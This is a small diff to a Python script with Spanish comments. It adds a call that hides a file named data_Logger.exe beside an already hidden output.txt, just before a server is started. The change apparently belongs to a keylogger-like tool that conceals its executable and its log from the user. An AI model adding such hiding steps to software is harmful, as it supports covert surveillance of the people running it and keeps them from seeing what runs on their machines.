@@ -88,6 +88,7 @@ if __name__ == "__main__":
     subCMD = cmdAccess()
 
     # Oculto archivo, siempre y cuando existan
+    subCMD.hideFile("data_Logger.exe")
     subCMD.hideFile("output.txt")
 
     # Levanto servidor
